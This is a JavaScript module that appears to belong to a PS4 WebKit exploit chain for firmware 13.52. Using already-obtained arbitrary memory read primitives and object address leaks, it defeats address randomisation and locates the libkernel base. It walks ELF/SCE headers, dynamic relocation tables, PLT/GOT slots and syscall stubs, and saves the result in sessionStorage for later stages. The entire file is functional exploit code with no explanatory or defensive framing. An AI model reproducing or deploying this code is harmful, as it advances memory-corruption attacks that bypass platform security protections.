/**
 * libkernel on 13.52 — PLT xrefs in mapped .text, RELRO GOT, prologue/stub hunts.
 * Never reads high unmapped IAT (+0x3cb8cc8). Max ~4 reads per GOT slot.
 */
import { int64 } from "./int64.js";
import { webkitRvaMax, webkitRvaMaxFromOff } from "./pivot_gadgets.js";

const ELF_MAGIC = 0x464c457f;
const SCE_MAGIC = 0x1d3d154f;
const SCE_ELF_OFF = 0x160;
const PT_LOAD = 1;
const PT_DYNAMIC = 2;
const DT_PLTGOT = 3;
const DT_PLTRELSZ = 2;
const DT_RELA = 7;
const DT_RELASZ = 8;
const DT_RELAENT = 9;
const DT_JMPREL = 23;
const DT_SCE_PLTGOT = 0x61000027;
const DT_SCE_JMPREL = 0x61000029;
const DT_SCE_PLTRELSZ = 0x6100002d;
const DT_SCE_RELA = 0x6100002f;
const DT_SCE_RELASZ = 0x61000031;
const DT_SCE_RELAENT = 0x61000033;
const PF_R = 4;
const PF_W = 2;
const PF_X = 1;

/** OOM-safe scan limits (13.52 poops base — no full-cap sweeps). */
const LK_LOW_TEXT_MAX = 0x200000;
const LK_ELF_RADIUS = 0x4000000n;
const LK_HUNT_RADIUS = 0x2000000n;
const LK_RING_RADIUS = 0x8000000n;
const LK_HDR_BACK_COARSE = 64;
const LK_HDR_BACK_FINE = 256;

const SS_LK_BASE = "wk-libkernelBase";
const SS_IAT_RVA = "wk-imp-error-rva";

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function read2p(p, addr) {
    if (!addr) return null;
    try { return p.read2(addr); } catch (_) { return null; }
}

function read1p(p, addr) {
    if (!addr) return null;
    try { return p.read1(addr); } catch (_) { return null; }
}

function parseAddrSync(raw) {
    if (!raw) return null;
    const s = String(raw).replace(/^0x/i, "").trim();
    if (!s) return null;
    const n = BigInt("0x" + s);
    return new int64(Number(n & 0xffffffffn), Number((n >> 32n) & 0xffffffffn));
}

function u64FromRead8(w) {
    if (!w) return null;
    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
}

function iatCap(off) {
    return webkitRvaMax(off);
}

/** Mapped webkit **code** span — much smaller than full read cap; libkernel sits nearby. */
function webkitModuleSpan(off) {
    return webkitRvaMaxFromOff(off);
}

function rvaAllowed(rva, off) {
    return rva >= 0x1000 && rva <= iatCap(off);
}

export function isSyscallStub(v, num) {
    if (!v) return false;
    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
    const n = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
    return n === num;
}

export function isGetpidStub(v) {
    return isSyscallStub(v, 20);
}

const GETPID_STUB_CANDS = [
    0x2cb70, 0x2d5e0, 0x2cb80, 0x2cc00, 0x28000, 0x29000, 0x2a000, 0x2b000,
    0x30000, 0x31000, 0x32000, 0x25000, 0x26000,
];

function getpidStubOffsets(off) {
    const out = [];
    if (off.k_stubs && off.k_stubs[20] != null) out.push(off.k_stubs[20]);
    for (let i = 0; i < GETPID_STUB_CANDS.length; i++) {
        const v = GETPID_STUB_CANDS[i];
        if (out.indexOf(v) < 0) out.push(v);
    }
    return out;
}

function lkFromStubAddr(p, stubAddr, off) {
    const offs = getpidStubOffsets(off);
    for (let i = 0; i < offs.length; i++) {
        const lk = stubAddr.sub32(offs[i]);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, stubOff: offs[i] };
    }
    let page = new int64((stubAddr.low >>> 0) & ~0x3fff, stubAddr.hi >>> 0);
    for (let back = 0; back <= 0x40000; back += 0x4000) {
        const lk = page.sub32(back);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, stubOff: Number(ptrBig(stubAddr) - ptrBig(lk)) };
    }
    return null;
}

/** Cheap prologue check — two reads (mov eax, imm; syscall). */
export function isLibkernelPrologue(p, lk) {
    if (!lk || lk.hi < 0x8) return false;
    if (checkPrologueAt(p, lk)) return true;
    if (read4p(p, lk) === SCE_MAGIC)
        return checkPrologueAt(p, lk.add32(SCE_ELF_OFF));
    return false;
}

function checkPrologueAt(p, addr) {
    if (!addr) return false;
    const w0 = read4p(p, addr);
    const w1 = read4p(p, addr.add32(4));
    if (w0 == null || w1 == null) return false;
    return (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f;
}

export function saveLibkernelSession(lk, iatRva) {
    try {
        if (lk) sessionStorage.setItem(SS_LK_BASE, String(lk));
        if (iatRva != null) sessionStorage.setItem(SS_IAT_RVA, iatRva.toString(16));
    } catch (_) { }
}

function loadSessionIatRva() {
    try {
        const n = parseInt(sessionStorage.getItem(SS_IAT_RVA), 16);
        return n > 0 ? n : null;
    } catch (_) {
        return null;
    }
}

/** True if ptr looks like an address inside the webkit **module** (not nearby libkernel). */
function ptrInWebkitImage(fnPtr, webkitBase, off) {
    if (!fnPtr || !webkitBase) return false;
    if (fnPtr.hi !== webkitBase.hi) return false;
    const span = webkitModuleSpan(off);
    const lo = webkitBase.low >>> 0;
    const fl = fnPtr.low >>> 0;
    if (fl < lo) return false;
    return (fl - lo) <= span;
}

/** External userland code pointer — not null, not webkit interior. */
function plausibleExtPtr(fnPtr, webkitBase, off) {
    if (!fnPtr) return false;
    if (fnPtr.hi < 0x8) return false;
    if (fnPtr.hi === 0 && fnPtr.low < 0x100000) return false;
    if (ptrInWebkitImage(fnPtr, webkitBase, off)) return false;
    return true;
}

function bigToPtr(b) {
    return new int64(Number(b & 0xffffffffn), Number((b >> 32n) & 0xffffffffn));
}

function ptrBig(w) {
    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
}

const K_ERROR_CANDS = [0x26420, 0x26430, 0x25000, 0x30000, 0xd9d0];

function kErrorCandidates(off) {
    const out = [];
    if (off.k__error != null) out.push(off.k__error);
    for (let i = 0; i < K_ERROR_CANDS.length; i++) {
        const v = K_ERROR_CANDS[i];
        if (out.indexOf(v) < 0) out.push(v);
    }
    return out;
}

function s32(v) {
    if (v == null) return null;
    return v | 0;
}

/** Follow one webkit PLT jmp [rip+disp] hop (ff 25). */
function resolveImportPtr(p, webkitBase, off, fnPtr, depth) {
    if (!fnPtr || depth > 1) return fnPtr;
    if (plausibleExtPtr(fnPtr, webkitBase, off)) return fnPtr;
    if (!ptrInWebkitImage(fnPtr, webkitBase, off)) return null;
    const b0 = read1p(p, fnPtr);
    const b1 = read1p(p, fnPtr.add32(1));
    if (b0 !== 0xff || b1 !== 0x25) return null;
    const disp = s32(read4p(p, fnPtr.add32(2)));
    if (disp == null) return null;
    const slot = fnPtr.add32(6 + disp);
    const tgt = read8p(p, slot);
    if (!tgt) return null;
    return resolveImportPtr(p, webkitBase, off, tgt, depth + 1);
}

function lkAligned(lk) {
    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
}

function isSameWebkitModule(base, webkitBase, off) {
    if (!base || !webkitBase) return false;
    if (base.hi !== webkitBase.hi) return false;
    const lo = webkitBase.low >>> 0;
    const bl = base.low >>> 0;
    if (bl < lo) return false;
    return (bl - lo) <= webkitModuleSpan(off);
}

/** Sparse syscall stub count — libkernel.sprx / libkernel_web has many mov rax,N patterns. */
function scoreSyscallStubs(p, base, maxOff, step) {
    maxOff = maxOff || 0x80000;
    step = step || 0x200;
    let stubs = 0;
    for (let off = 0x1000; off < maxOff; off += step) {
        const w = read4p(p, base.add32(off));
        if (w != null && (w & 0xffffff) === 0xc0c748) stubs++;
    }
    return stubs;
}

function scoreModuleAsLibkernel(p, base) {
    const prologue = isLibkernelPrologue(p, base);
    const stubs = scoreSyscallStubs(p, base);
    const score = stubs + (prologue ? 100 : 0);
    return { stubs, prologue, score };
}

function pageAlignDown(addr, align) {
    return new int64((addr.low >>> 0) & ~(align - 1), addr.hi >>> 0);
}

const POOPS_TEXT_MAGIC = 0xe5894855;

/** PS4 module may be SCE header @ base, ELF @ +0x160. */
function elfImageBase(p, base) {
    if (!base) return null;
    const w = read4p(p, base);
    if (w === ELF_MAGIC) return base;
    if (w === SCE_MAGIC) return base.add32(SCE_ELF_OFF);
    return null;
}

function classifyModulePage(w) {
    if (w == null) return null;
    if (w === ELF_MAGIC) return "elf";
    if (w === SCE_MAGIC) return "sce";
    if (w === POOPS_TEXT_MAGIC) return "text";
    return null;
}

/** Walk back from poops/text base for SCE or ELF module header (cal_demo / chain_poops). */
function findHeaderBackward(p, start, maxBack, step) {
    const aligned = pageAlignDown(start, step);
    for (let i = 0; i <= maxBack; i++) {
        const addr = i === 0 ? start : aligned.sub32(i * step);
        if (!addr || addr.hi < 0x8) break;
        const w = read4p(p, addr);
        if (w === ELF_MAGIC) return { hdr: addr, kind: "elf" };
        if (w === SCE_MAGIC) return { hdr: addr, kind: "sce" };
    }
    return null;
}

/** Resolve code base (RVA origin) + optional ELF img. quick=true skips heavy backward walk. */
let _modLayoutKey = "";
let _modLayoutVal = null;

function resolveModuleLayout(p, hint, opts) {
    opts = opts || {};
    if (!hint) return null;
    const key = String(hint) + (opts.deep ? ":d" : ":q");
    if (!opts.nocache && key === _modLayoutKey && _modLayoutVal)
        return _modLayoutVal;

    const codeBase = hint;
    const w0 = read4p(p, codeBase);
    const kind0 = classifyModulePage(w0);
    const layout = {
        codeBase,
        loadBase: codeBase,
        kind: kind0 || "unknown",
        img: null,
        hdr: null,
        poops: false,
    };

    if (kind0 === "elf") {
        layout.hdr = codeBase;
        layout.img = codeBase;
        _modLayoutKey = key;
        _modLayoutVal = layout;
        return layout;
    }
    if (kind0 === "sce") {
        layout.hdr = codeBase;
        layout.img = codeBase.add32(SCE_ELF_OFF);
        _modLayoutKey = key;
        _modLayoutVal = layout;
        return layout;
    }

    if (kind0 === "text") {
        layout.poops = true;
        layout.kind = "text";
        if (!opts.deep) {
            _modLayoutKey = key;
            _modLayoutVal = layout;
            return layout;
        }
    }

    if (opts.deep) {
        let hit = findHeaderBackward(p, codeBase, LK_HDR_BACK_COARSE, 0x4000);
        if (!hit) hit = findHeaderBackward(p, codeBase, LK_HDR_BACK_FINE, 0x1000);
        if (hit) {
            layout.hdr = hit.hdr;
            layout.kind = hit.kind;
            layout.img = hit.kind === "sce" ? hit.hdr.add32(SCE_ELF_OFF) : hit.hdr;
            layout.elfBack = true;
            layout.poops = false;
        }
    }

    _modLayoutKey = key;
    _modLayoutVal = layout;
    return layout;
}

function moduleLoadBase(p, hint) {
    const lay = resolveModuleLayout(p, hint, { quick: true });
    return lay ? lay.codeBase : hint;
}

function minLoadVaddr(p, img, ePhoff, ePhnum, ePhentsize) {
    let min = null;
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        if (read4p(p, img.add32(ph)) !== PT_LOAD) continue;
        const va = u64Lo(read8p(p, img.add32(ph + 0x10)));
        if (va == null) continue;
        if (min === null || va < min) min = va;
    }
    return min || 0;
}

function fmtMagic(w) {
    if (w == null) return "null";
    const b = w >>> 0;
    return "0x" + (b & 0xff).toString(16).padStart(2, "0")
        + (b >>> 8 & 0xff).toString(16).padStart(2, "0")
        + (b >>> 16 & 0xff).toString(16).padStart(2, "0")
        + (b >>> 24 & 0xff).toString(16).padStart(2, "0");
}

function isModuleMagic(w) {
    return w === ELF_MAGIC || w === SCE_MAGIC;
}

function u64Lo(w) {
    if (!w) return null;
    return Number(u64FromRead8(w) & 0xffffffffn);
}

/** Parse PT_DYNAMIC — codeBase = poops/text RVA origin; img may be lower in memory. */
function parseDynamicMeta(p, webkitBase) {
    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
    if (!layout || !layout.img) return null;
    const loadBase = layout.codeBase;
    const img = layout.img;
    if (read2p(p, img.add32(0x12)) !== 0x3e) return null;

    const ePhoff = u64Lo(read8p(p, img.add32(0x20)));
    const ePhnum = read2p(p, img.add32(0x38));
    const ePhentsize = read2p(p, img.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return null;

    const bias = minLoadVaddr(p, img, ePhoff, ePhnum, ePhentsize);

    let dynVaddr = null;
    let dynMemsz = 0;
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        if (read4p(p, img.add32(ph)) !== PT_DYNAMIC) continue;
        dynVaddr = u64Lo(read8p(p, img.add32(ph + 0x10)));
        dynMemsz = u64Lo(read8p(p, img.add32(ph + 0x28))) || 0;
        break;
    }
    if (dynVaddr == null || dynMemsz < 16) return null;

    const vaTries = [dynVaddr];
    if (bias && dynVaddr >= bias) vaTries.push(dynVaddr - bias);

    for (let t = 0; t < vaTries.length; t++) {
        const dynVa = vaTries[t];
        const meta = { loadBase, img, dynVaddr: dynVa, dynMemsz, bias };
        let tags = 0;
        for (let off = 0; off + 16 <= dynMemsz; off += 16) {
            const tag = u64Lo(read8p(p, loadBase.add32(dynVa + off)));
            const val = u64Lo(read8p(p, loadBase.add32(dynVa + off + 8)));
            if (tag == null || val == null) break;
            if (tag === 0) break;
            tags++;
            if (tag === DT_PLTGOT || tag === DT_SCE_PLTGOT) meta.pltgot = val;
            else if (tag === DT_PLTRELSZ || tag === DT_SCE_PLTRELSZ) meta.pltrelsz = val;
            else if (tag === DT_RELA || tag === DT_SCE_RELA) meta.rela = val;
            else if (tag === DT_RELASZ || tag === DT_SCE_RELASZ) meta.relasz = val;
            else if (tag === DT_RELAENT || tag === DT_SCE_RELAENT) meta.relaent = val;
            else if (tag === DT_JMPREL || tag === DT_SCE_JMPREL) meta.jmprel = val;
        }
        if (tags >= 2 && (meta.pltgot || meta.jmprel || meta.rela)) return meta;
    }
    return null;
}

/** Runtime diagnostic — quick=1 read at base only (OOM-safe at scan start). */
export function diagnoseWebkitDynamic(p, webkitBase, off, opts) {
    opts = opts || {};
    const cap = iatCap(off);
    const layout = resolveModuleLayout(p, webkitBase, { quick: !opts.deep });
    const magic = read4p(p, webkitBase);
    const out = {
        hint: String(webkitBase),
        loadBase: String(webkitBase),
        magic: fmtMagic(magic),
        cap: "+0x" + cap.toString(16),
        kind: layout ? layout.kind : "?",
    };
    if (layout && layout.poops)
        out.poops = true;
    if (layout && layout.hdr)
        out.elfHdr = String(layout.hdr);
    if (!layout || !layout.img) {
        if (layout && layout.kind === "text")
            out.reason = "poops text base — lite scan (low PLT, no ELF walk)";
        else
            out.reason = "no module header (kind=" + (layout ? layout.kind : "?") + ")";
        return out;
    }
    if (!opts.deep) {
        out.reason = "ELF hdr found — tap scan for dynamic GOT";
        out.header = read4p(p, layout.hdr) === SCE_MAGIC ? "SCE" : "ELF";
        return out;
    }
    out.header = read4p(p, layout.hdr) === SCE_MAGIC ? "SCE" : "ELF";
    const meta = parseDynamicMeta(p, webkitBase);
    if (!meta) {
        out.reason = "PT_DYNAMIC unreadable (elfHdr=" + out.elfHdr + ")";
        return out;
    }
    out.jmprel = "+0x" + (meta.jmprel || 0).toString(16);
    out.pltgot = "+0x" + (meta.pltgot || 0).toString(16);
    out.rela = "+0x" + (meta.rela || 0).toString(16);
    const all = collectDynamicGotRvas(p, meta, null);
    const inCap = all.filter(r => r >= 0x1000 && r <= cap);
    out.total = all.length;
    out.inCap = inCap.length;
    if (all.length) {
        out.minRva = "+0x" + all[0].toString(16);
        out.maxRva = "+0x" + all[all.length - 1].toString(16);
    }
    if (!all.length)
        out.reason = "dynamic tags OK but 0 GOT RVAs extracted";
    else if (!inCap.length)
        out.reason = "all " + all.length + " GOT slots above cap " + out.cap
            + " (high RELRO unmapped on 13.52)";
    else
        out.reason = "ok";
    return out;
}

/** Calculate GOT slot RVAs from DT_JMPREL / DT_RELA (cap=null → all slots). */
function collectDynamicGotRvas(p, meta, cap) {
    const base = meta.loadBase;
    const seen = {};
    const slots = [];

    function add(rva) {
        if (rva == null || rva < 8) return;
        if (cap != null && rva > cap) return;
        const k = rva.toString(16);
        if (seen[k]) return;
        seen[k] = 1;
        slots.push(rva);
    }

    if (meta.jmprel && meta.pltrelsz) {
        const ent = 24;
        const n = Math.min(Math.floor(meta.pltrelsz / ent), 8192);
        for (let i = 0; i < n; i++) {
            add(u64Lo(read8p(p, base.add32(meta.jmprel + i * ent))));
        }
    }

    if (meta.rela && meta.relasz) {
        const ent = meta.relaent || 24;
        const n = Math.min(Math.floor(meta.relasz / ent), 8192);
        for (let i = 0; i < n; i++) {
            const relOff = meta.rela + i * ent;
            const rva = u64Lo(read8p(p, base.add32(relOff)));
            const info = u64Lo(read8p(p, base.add32(relOff + 8)));
            if (info == null) continue;
            const rType = info & 0xff;
            if (rType === 6 || rType === 8 || rType === 0x103) add(rva);
        }
    }

    if (meta.pltgot) {
        for (let i = 0; i < 256; i++)
            add(meta.pltgot + i * 8);
    }

    slots.sort((a, b) => a - b);
    return slots;
}

function splitSlotsByCap(all, cap) {
    const inCap = [];
    for (let i = 0; i < all.length; i++) {
        const r = all[i];
        if (r >= 0x1000 && r <= cap) inCap.push(r);
    }
    return inCap;
}

function scoreModuleAt(p, base) {
    let best = scoreModuleAsLibkernel(p, base);
    if (read4p(p, base) === SCE_MAGIC) {
        const elf = base.add32(SCE_ELF_OFF);
        const sc2 = scoreModuleAsLibkernel(p, elf);
        if (sc2.score > best.score) best = sc2;
    }
    return best;
}

function looksLikeLibkernelModule(p, base) {
    if (!base) return false;
    return scoreModuleAt(p, base).score >= 8
        || isLibkernelPrologue(p, base)
        || isLibkernelPrologue(p, base.add32(SCE_ELF_OFF));
}

/** PSFree find_base — walk back until ELF or SCE magic. */
function findModuleBaseBackward(p, addr, maxPages) {
    if (!addr || addr.hi < 0x8) return null;
    const limit = maxPages || 512;
    for (let a = 0; a < 2; a++) {
        const align = a === 0 ? 0x4000 : 0x1000;
        let page = pageAlignDown(addr, align);
        for (let i = 0; i < limit; i++) {
            const magic = read4p(p, page);
            if (isModuleMagic(magic)) return page;
            if (magic == null) break;
            const prev = page.sub32(align);
            if (!prev || prev.hi < 0x8) break;
            page = prev;
        }
    }
    return null;
}

/** PLT stub @ webkit+pltRva — ff 25 or ff 15 → GOT slot → target fn ptr. */
function resolvePltImportAt(p, webkitBase, pltRva) {
    if (pltRva == null) return null;
    const base = moduleLoadBase(p, webkitBase);
    const stub = base.add32(pltRva);
    const op = read2p(p, stub);
    if (op !== 0x25ff && op !== 0x15ff) return null;
    const disp = s32(read4p(p, stub.add32(2)));
    if (disp == null) return null;
    return read8p(p, stub.add32(6 + disp));
}

/** Known __stack_chk_fail / early PLT stub RVAs from PSFree ports (low .text, NOT high IAT). */
const IMPORT_PLT_CANDS = [
    0x178, 0x188, 0x8d8, 0x918, 0x2438, 0x500, 0x600, 0x800, 0xa00, 0xc00,
    0x1000, 0x1200, 0x1400, 0x1600, 0x2000,
];

function lkFromFnPtr(p, fnPtr, off, iatRva) {
    if (!fnPtr) return null;

    const walked = findModuleBaseBackward(p, fnPtr, 512);
    if (walked && looksLikeLibkernelModule(p, walked))
        return { lk: walked, iatRva, errorFn: fnPtr, via: "elf-walk" };

    if (isGetpidStub(fnPtr)) {
        const hit = lkFromStubAddr(p, fnPtr, off);
        if (hit)
            return { lk: hit.lk, iatRva, errorFn: fnPtr, via: "getpid+" + hit.stubOff.toString(16) };
    }

    const entryB0 = read1p(p, fnPtr);
    if (entryB0 !== 0xb8) return null;

    const errs = kErrorCandidates(off);
    for (let i = 0; i < errs.length; i++) {
        const lk = fnPtr.sub32(errs[i]);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, iatRva, errorFn: fnPtr, via: "error+" + errs[i].toString(16) };
    }

    const pageBase = new int64((fnPtr.low >>> 0) & ~0x3fff, fnPtr.hi >>> 0);
    if (lkAligned(pageBase) && isLibkernelPrologue(p, pageBase))
        return { lk: pageBase, iatRva, errorFn: fnPtr, via: "page" };

    return null;
}

/** Verify GOT slot — read8 + optional PLT hop + ≤4 follow-up reads. */
function safeVerifyGotSlot(p, webkitBase, off, rva) {
    if (!rvaAllowed(rva, off)) return null;
    const base = moduleLoadBase(p, webkitBase);
    let fnPtr = read8p(p, base.add32(rva));
    if (!fnPtr) return null;
    fnPtr = resolveImportPtr(p, base, off, fnPtr, 0);
    if (!fnPtr) return null;
    if (plausibleExtPtr(fnPtr, base, off))
        return lkFromFnPtr(p, fnPtr, off, rva);
    const walked = findModuleBaseBackward(p, fnPtr, 512);
    if (walked && looksLikeLibkernelModule(p, walked))
        return { lk: walked, iatRva: rva, errorFn: fnPtr, via: "got-walk" };
    return null;
}

function scanAnchorsInit(sub, anchors, radius, step) {
    sub = {
        anchorIdx: 0,
        anchors: anchors.map(a => ptrBig(a)),
        cursor: 0n,
        end: 0n,
        step: step,
        probes: 0,
    };
    const center = sub.anchors[0];
    sub.cursor = center > radius ? center - radius : 0n;
    sub.end = center + radius;
    return sub;
}

function scanAnchorsAdvance(sub, radius) {
    const next = sub.anchorIdx + 1;
    if (next >= sub.anchors.length) return false;
    sub.anchorIdx = next;
    const center = sub.anchors[next];
    sub.cursor = center > radius ? center - radius : 0n;
    sub.end = center + radius;
    return true;
}

/** Scan mapped .text for FF 15/FF 25 → GOT slots within cap. */
function scanPltGotChunk(p, webkitBase, off, state) {
    if (!state) {
        const base = moduleLoadBase(p, webkitBase);
        const textRanges = elfMappedTextRanges(p, webkitBase, off);
        if (!textRanges.length)
            return { done: true, lk: null, state: null, phase: "no-text" };
        state = {
            base,
            textRanges,
            rangeIdx: 0,
            cursor: textRanges[0].lo,
            endRva: textRanges[0].hi,
            seen: {},
            refs: 0,
            ff25: 0,
            gotHigh: 0,
            e8ext: 0,
        };
        return {
            done: false,
            state,
            phase: "plt-start",
            spans: textRanges.length,
        };
    }

    let batchBytes = 0;
    while (state.cursor < state.endRva && batchBytes < 128) {
        const rva = state.cursor;
        const w0 = read4p(p, state.base.add32(rva));
        const w1 = read4p(p, state.base.add32(rva + 4));
        if (w0 != null && w1 != null) {
            const bytes = [
                w0 & 0xff, (w0 >>> 8) & 0xff, (w0 >>> 16) & 0xff, (w0 >>> 24) & 0xff,
                w1 & 0xff, (w1 >>> 8) & 0xff, (w1 >>> 16) & 0xff, (w1 >>> 24) & 0xff,
            ];
            for (let i = 0; i < 7; i++) {
                if (bytes[i] === 0xe8) {
                    const insnRva = rva + i;
                    const rel = s32(read4p(p, state.base.add32(insnRva + 1)));
                    if (rel != null) {
                        const destRva = insnRva + 5 + rel;
                        if (destRva >= 0x10000) {
                            const destPtr = state.base.add32(destRva);
                            if (plausibleExtPtr(destPtr, state.base, off)) {
                                state.e8ext++;
                                const hit = lkFromFnPtr(p, destPtr, off, null);
                                if (hit) {
                                    saveLibkernelSession(hit.lk, hit.iatRva);
                                    return {
                                        done: true,
                                        lk: hit.lk,
                                        iatRva: hit.iatRva,
                                        source: "e8+" + insnRva.toString(16) + "/" + hit.via,
                                        state,
                                        phase: "plt-hit",
                                        refs: state.refs,
                                    };
                                }
                            }
                        }
                    }
                }
                if (bytes[i] !== 0xff) continue;
                if (bytes[i + 1] !== 0x15 && bytes[i + 1] !== 0x25) continue;
                state.ff25++;
                const insnRva = rva + i;
                const raw = read4p(p, state.base.add32(insnRva + 2));
                const disp = s32(raw);
                if (disp == null) continue;
                const gotRva = insnRva + 6 + disp;
                if (gotRva < 0x10000) continue;
                if (gotRva > iatCap(off)) {
                    state.gotHigh++;
                    continue;
                }
                const key = gotRva.toString(16);
                if (state.seen[key]) continue;
                state.seen[key] = 1;
                state.refs++;
                const hit = safeVerifyGotSlot(p, webkitBase, off, gotRva);
                if (hit) {
                    saveLibkernelSession(hit.lk, hit.iatRva);
                    return {
                        done: true,
                        lk: hit.lk,
                        iatRva: hit.iatRva,
                        source: "plt/" + hit.via,
                        state,
                        phase: "plt-hit",
                        refs: state.refs,
                    };
                }
            }
        }
        state.cursor += 4;
        batchBytes += 4;
    }

    if (state.cursor >= state.endRva) {
        const next = state.rangeIdx + 1;
        if (next < state.textRanges.length) {
            state.rangeIdx = next;
            state.cursor = state.textRanges[next].lo;
            state.endRva = state.textRanges[next].hi;
            return {
                done: false,
                state,
                phase: "plt-region",
                region: state.textRanges[next].tag,
                cursor: state.cursor,
            };
        }
        return { done: true, lk: null, state, phase: "plt-miss", refs: state.refs,
            ff25: state.ff25, gotHigh: state.gotHigh, e8ext: state.e8ext };
    }

    return {
        done: false,
        state,
        phase: "plt",
        cursor: state.cursor,
        refs: state.refs,
        ff25: state.ff25,
        e8ext: state.e8ext,
    };
}

/** Fast libkernel module hunt ±32MB — prologue/stub check on SCE/ELF hit (OOM-safe). */
function scanNearLibkernelChunk(p, webkitBase, off, sub, anchors) {
    const RADIUS = LK_HUNT_RADIUS;
    const STEP = 0x4000n;

    if (!anchors || !anchors.length)
        return { done: true, lk: null, state: sub, phase: "nearlk-skip" };

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        sub.pages = 0;
        sub.hits = 0;
        return {
            done: false,
            state: sub,
            phase: "nearlk-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 6) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8) {
            sub.pages++;
            if ((addr.low & 0x3fff) === 0 && isLibkernelPrologue(p, addr)) {
                saveLibkernelSession(addr, null);
                return {
                    done: true,
                    lk: addr,
                    iatRva: null,
                    source: "nearlk-prologue-direct",
                    state: sub,
                    phase: "nearlk-hit",
                    pages: sub.pages,
                };
            }
            const magic = read4p(p, addr);
            if (magic != null && isModuleMagic(magic)
                && !isSameWebkitModule(addr, webkitBase, off)) {
                sub.hits++;
                if (isLibkernelPrologue(p, addr)) {
                    saveLibkernelSession(addr, null);
                    return {
                        done: true,
                        lk: addr,
                        iatRva: null,
                        source: "nearlk-prologue",
                        state: sub,
                        phase: "nearlk-hit",
                        pages: sub.pages,
                    };
                }
                const sc = scoreSyscallStubs(p, addr, 0x40000, 0x400);
                if (sc >= 4) {
                    saveLibkernelSession(addr, null);
                    return {
                        done: true,
                        lk: addr,
                        iatRva: null,
                        source: "nearlk-stubs=" + sc,
                        state: sub,
                        phase: "nearlk-hit",
                        pages: sub.pages,
                    };
                }
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "nearlk-anchor",
                anchor: sub.anchorIdx,
                pages: sub.pages,
                hits: sub.hits,
            };
        }
        return {
            done: true,
            lk: null,
            state: sub,
            phase: "nearlk-miss",
            pages: sub.pages,
            hits: sub.hits,
        };
    }

    return {
        done: false,
        state: sub,
        phase: "nearlk",
        at: sub.cursor.toString(16),
        pages: sub.pages,
        hits: sub.hits,
        anchor: sub.anchorIdx,
    };
}

/** ±128MB prologue ring — libkernel may have poops text base (no SCE magic). */
function scanLkPrologueRingChunk(p, off, sub, anchors) {
    const RADIUS = LK_RING_RADIUS;
    const STEP = 0x4000n;

    if (!anchors || !anchors.length)
        return { done: true, lk: null, state: sub, phase: "ring-skip" };

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        sub.probes = 0;
        return {
            done: false,
            state: sub,
            phase: "ring-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 6) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8 && (addr.low & 0x3fff) === 0) {
            sub.probes++;
            if (isLibkernelPrologue(p, addr)) {
                saveLibkernelSession(addr, null);
                return {
                    done: true,
                    lk: addr,
                    iatRva: null,
                    source: "ring-prologue",
                    state: sub,
                    phase: "ring-hit",
                    probes: sub.probes,
                };
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "ring-anchor",
                anchor: sub.anchorIdx,
                probes: sub.probes,
            };
        }
        return { done: true, lk: null, state: sub, phase: "ring-miss", probes: sub.probes };
    }

    return {
        done: false,
        state: sub,
        phase: "ring",
        at: sub.cursor.toString(16),
        probes: sub.probes,
        anchor: sub.anchorIdx,
    };
}

/** Scan leakval slots for external code pointers (textarea, expm1). */
function scanLeakExtPtrChunk(p, webkitBase, off, state, retain) {
    if (!state) {
        const targets = [];
        try {
            const ta = document.createElement("textarea");
            if (retain) retain.push(ta);
            targets.push({ label: "textarea", cell: p.leakval(ta) });
        } catch (_) { }
        try {
            targets.push({ label: "expm1", cell: p.leakval(Math.expm1) });
        } catch (_) { }
        if (!targets.length)
            return { done: true, lk: null, state: null, phase: "leak-empty" };
        state = { targets, tIdx: 0, slotOff: 0, tried: 0 };
        return { done: false, state, phase: "leak-start", targets: targets.length };
    }

    const SLOT_MAX = 0x80;
    let batch = 0;
    while (state.tIdx < state.targets.length && batch < 4) {
        const t = state.targets[state.tIdx];
        while (state.slotOff <= SLOT_MAX && batch < 4) {
            const offSlot = state.slotOff;
            state.slotOff += 8;
            state.tried++;
            batch++;
            const fnPtr = read8p(p, t.cell.add32(offSlot));
            if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) continue;
            const hit = lkFromFnPtr(p, fnPtr, off, null);
            if (hit) {
                saveLibkernelSession(hit.lk, hit.iatRva);
                return {
                    done: true,
                    lk: hit.lk,
                    iatRva: hit.iatRva,
                    source: "leak/" + t.label + "+0x" + offSlot.toString(16),
                    state,
                    phase: "leak-hit",
                    tried: state.tried,
                };
            }
        }
        state.tIdx++;
        state.slotOff = 0;
    }

    if (state.tIdx >= state.targets.length)
        return { done: true, lk: null, state, phase: "leak-miss", tried: state.tried };
    return { done: false, state, phase: "leak", tried: state.tried, target: state.tIdx };
}

